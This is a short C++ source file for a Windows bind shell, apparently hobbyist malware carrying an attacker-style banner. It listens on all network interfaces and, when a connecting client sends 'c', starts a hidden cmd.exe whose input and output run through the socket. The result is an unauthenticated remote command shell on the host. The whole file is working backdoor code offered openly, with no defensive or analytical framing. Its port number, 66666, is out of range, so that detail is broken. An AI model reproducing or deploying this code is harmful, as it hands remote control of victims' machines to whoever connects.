// bindshell.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <winsock2.h>

int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow)
{
	WSAData data;

	WSAStartup(MAKEWORD(1,1),&data);

	struct sockaddr_in server;
	int ss,cs;

	server.sin_family = AF_INET;
	server.sin_port = htons(66666);
	server.sin_addr.S_un.S_addr	= INADDR_ANY;
	memset(server.sin_zero,0,8);

	ss = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
		
	
	if(bind(ss,(struct sockaddr*)&server,sizeof(struct sockaddr_in))!=0)
	{
		MessageBoxA(NULL,"Error","Can not bind port",MB_OK);
		closesocket(ss);
		return 0;
	}

	if(listen(ss,1)!=0)
	{
		MessageBoxA(NULL,"Error","Can not listen port",MB_OK);
		closesocket(ss);
		return 0;
	}

	char welcome[]   = "<l4t3n8> Bindshell - reporting for dutiy !\n\n";
	char exit_txt[]  = "Terminating Bindshell !\n";
	char start_cmd[] = "Starting CMD !\n";
	bool run = true;
	char ch;

	while(run)
	{
		if((cs = accept(ss,NULL,NULL))!=INVALID_SOCKET)
		{			
			send(cs,welcome,strlen(welcome),0);			
			recv(cs,&ch,1,0);

			if(ch == 'q') 
			{
				run = false;
				send(cs,exit_txt,strlen(exit_txt),0);
				closesocket(cs);
			}
			else if( ch == 'c')
			{
				send(cs,start_cmd,strlen(start_cmd),0);
	
				STARTUPINFO s_info;
				PROCESS_INFORMATION p_info;
				
				GetStartupInfo(&s_info);

				s_info.dwFlags	   = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;				
				s_info.wShowWindow = SW_HIDE;				
				s_info.hStdError   = (HANDLE)cs;
				s_info.hStdInput   = (HANDLE)cs;
				s_info.hStdOutput  = (HANDLE)cs;

				CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, 0, NULL, &s_info, &p_info);				
			}			
			closesocket(cs);
		}
	}
	
	closesocket(ss);
	WSACleanup();

	return 0;
}



